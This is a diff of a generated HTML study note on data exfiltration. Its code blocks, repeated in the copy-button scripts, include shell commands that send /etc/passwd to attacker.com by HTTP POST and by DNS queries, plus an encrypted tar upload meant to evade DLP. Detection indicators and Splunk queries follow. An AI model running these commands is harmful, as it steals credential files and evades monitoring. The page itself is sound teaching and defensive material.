@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-30 Thu 22:12 -->
+<!-- 2026-07-30 Thu 22:21 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Data Exfiltration</title>
@@ -998,11 +998,11 @@ avoid triggering DLP or anomaly detection:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_732ffaab78f34cec83dfe4633ce11f0a>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_f9b12aa24d5d4cae81b00f128751a0da>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_732ffaab78f34cec83dfe4633ce11f0a=document.querySelector('button[name=btn_732ffaab78f34cec83dfe4633ce11f0a]');
-copyBtnbtn_732ffaab78f34cec83dfe4633ce11f0a.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# HTTP exfiltration (blends with normal web traffic)\ncurl -X POST https://attacker.com/receive \\\n  -F \"data=@/etc/passwd\"\n\n# DNS exfiltration (bypasses HTTP inspection)\n# Encode data as subdomain — dnscat2, iodine\ncat /etc/passwd | base64 | while read chunk; do\n    dig ${chunk}.attacker.com\ndone\n\n# HTTPS to legitimate cloud (bypasses domain blocklists)\n# Upload to S3 bucket, Dropbox, or GitHub controlled by attacker\n\n# Compress and encrypt before exfil to reduce size and evade DLP\ntar czf - /sensitive/data | openssl enc -aes-256-cbc -k password \\\n  | curl -X POST https://attacker.com/ --data-binary @-\n`);copyBtnbtn_732ffaab78f34cec83dfe4633ce11f0a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_732ffaab78f34cec83dfe4633ce11f0a.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_f9b12aa24d5d4cae81b00f128751a0da=document.querySelector('button[name=btn_f9b12aa24d5d4cae81b00f128751a0da]');
+copyBtnbtn_f9b12aa24d5d4cae81b00f128751a0da.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# HTTP exfiltration (blends with normal web traffic)\ncurl -X POST https://attacker.com/receive \\\n  -F \"data=@/etc/passwd\"\n\n# DNS exfiltration (bypasses HTTP inspection)\n# Encode data as subdomain — dnscat2, iodine\ncat /etc/passwd | base64 | while read chunk; do\n    dig ${chunk}.attacker.com\ndone\n\n# HTTPS to legitimate cloud (bypasses domain blocklists)\n# Upload to S3 bucket, Dropbox, or GitHub controlled by attacker\n\n# Compress and encrypt before exfil to reduce size and evade DLP\ntar czf - /sensitive/data | openssl enc -aes-256-cbc -k password \\\n  | curl -X POST https://attacker.com/ --data-binary @-\n`);copyBtnbtn_f9b12aa24d5d4cae81b00f128751a0da.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f9b12aa24d5d4cae81b00f128751a0da.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1038,11 +1038,11 @@ See <a href="20260214T085940--post-exploitation__concept_cybersecurity.html">Pos
 <h3 id="orga683702">Volume-based</h3>
 <div class="outline-text-3" id="text-orga683702">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_e2e2cd87ce4346dcbcf53c5d504e7875>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_5fa5d1a86dee474eaea4249ea0fdbd52>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_e2e2cd87ce4346dcbcf53c5d504e7875=document.querySelector('button[name=btn_e2e2cd87ce4346dcbcf53c5d504e7875]');
-copyBtnbtn_e2e2cd87ce4346dcbcf53c5d504e7875.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`— Unusually large outbound transfers from a single host\n— Data transferred at unusual times (off-hours)\n— Sustained high bandwidth to a single external IP\n`);copyBtnbtn_e2e2cd87ce4346dcbcf53c5d504e7875.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e2e2cd87ce4346dcbcf53c5d504e7875.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_5fa5d1a86dee474eaea4249ea0fdbd52=document.querySelector('button[name=btn_5fa5d1a86dee474eaea4249ea0fdbd52]');
+copyBtnbtn_5fa5d1a86dee474eaea4249ea0fdbd52.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`— Unusually large outbound transfers from a single host\n— Data transferred at unusual times (off-hours)\n— Sustained high bandwidth to a single external IP\n`);copyBtnbtn_5fa5d1a86dee474eaea4249ea0fdbd52.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_5fa5d1a86dee474eaea4249ea0fdbd52.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1057,11 +1057,11 @@ let res = copyTextToClipboard(`— Unusually large outbound transfers from a sin
 <h3 id="org68e793a">Protocol-based</h3>
 <div class="outline-text-3" id="text-org68e793a">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_bc41eaa061194472ae43e181108df5be>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_9599c13e8ee84c02ae8e253d0eee1628>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_bc41eaa061194472ae43e181108df5be=document.querySelector('button[name=btn_bc41eaa061194472ae43e181108df5be]');
-copyBtnbtn_bc41eaa061194472ae43e181108df5be.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`— DNS: high query rate, long subdomain labels, NXDOMAIN flood\n— ICMP: oversized ping payloads, high frequency\n— HTTP: large POST bodies to unknown destinations\n— Encrypted traffic to non-standard ports\n`);copyBtnbtn_bc41eaa061194472ae43e181108df5be.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_bc41eaa061194472ae43e181108df5be.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_9599c13e8ee84c02ae8e253d0eee1628=document.querySelector('button[name=btn_9599c13e8ee84c02ae8e253d0eee1628]');
+copyBtnbtn_9599c13e8ee84c02ae8e253d0eee1628.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`— DNS: high query rate, long subdomain labels, NXDOMAIN flood\n— ICMP: oversized ping payloads, high frequency\n— HTTP: large POST bodies to unknown destinations\n— Encrypted traffic to non-standard ports\n`);copyBtnbtn_9599c13e8ee84c02ae8e253d0eee1628.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_9599c13e8ee84c02ae8e253d0eee1628.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1077,11 +1077,11 @@ let res = copyTextToClipboard(`— DNS: high query rate, long subdomain labels, 
 <h3 id="orgc372eca">DLP Detection</h3>
 <div class="outline-text-3" id="text-orgc372eca">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_82ccbcbb08794db48ff8eb8550f00381>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_afdffd18959b461ebc903f9c4ca5936f>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_82ccbcbb08794db48ff8eb8550f00381=document.querySelector('button[name=btn_82ccbcbb08794db48ff8eb8550f00381]');
-copyBtnbtn_82ccbcbb08794db48ff8eb8550f00381.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`— Content inspection: PII, financial data, credential patterns\n  in outbound HTTP/email\n— Block upload to unapproved cloud storage\n— Alert on large volume transfers to external destinations\n— USB write detection on endpoints\n`);copyBtnbtn_82ccbcbb08794db48ff8eb8550f00381.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_82ccbcbb08794db48ff8eb8550f00381.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_afdffd18959b461ebc903f9c4ca5936f=document.querySelector('button[name=btn_afdffd18959b461ebc903f9c4ca5936f]');
+copyBtnbtn_afdffd18959b461ebc903f9c4ca5936f.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`— Content inspection: PII, financial data, credential patterns\n  in outbound HTTP/email\n— Block upload to unapproved cloud storage\n— Alert on large volume transfers to external destinations\n— USB write detection on endpoints\n`);copyBtnbtn_afdffd18959b461ebc903f9c4ca5936f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_afdffd18959b461ebc903f9c4ca5936f.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1098,11 +1098,11 @@ let res = copyTextToClipboard(`— Content inspection: PII, financial data, cred
 <h3 id="org378517e">Splunk / SIEM</h3>
 <div class="outline-text-3" id="text-org378517e">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SPLUNK</span><button class='copyBtn' name=btn_55f5f38acd504a7caed6d8679129fba5>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SPLUNK</span><button class='copyBtn' name=btn_2f5d13cd67214491b97900f3d19d8763>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_55f5f38acd504a7caed6d8679129fba5=document.querySelector('button[name=btn_55f5f38acd504a7caed6d8679129fba5]');
-copyBtnbtn_55f5f38acd504a7caed6d8679129fba5.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`| Large outbound transfers\nindex=network\n| stats sum(bytes_out) as total_bytes by src_ip, dest_ip\n| where total_bytes > 100000000\n| sort -total_bytes\n\n| DNS query anomaly (potential tunnelling)\nindex=dns\n| stats count, avg(query_length) as avg_len by src_ip\n| where count > 500 OR avg_len > 50\n`);copyBtnbtn_55f5f38acd504a7caed6d8679129fba5.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_55f5f38acd504a7caed6d8679129fba5.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_2f5d13cd67214491b97900f3d19d8763=document.querySelector('button[name=btn_2f5d13cd67214491b97900f3d19d8763]');
+copyBtnbtn_2f5d13cd67214491b97900f3d19d8763.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`| Large outbound transfers\nindex=network\n| stats sum(bytes_out) as total_bytes by src_ip, dest_ip\n| where total_bytes > 100000000\n| sort -total_bytes\n\n| DNS query anomaly (potential tunnelling)\nindex=dns\n| stats count, avg(query_length) as avg_len by src_ip\n| where count > 500 OR avg_len > 50\n`);copyBtnbtn_2f5d13cd67214491b97900f3d19d8763.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2f5d13cd67214491b97900f3d19d8763.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
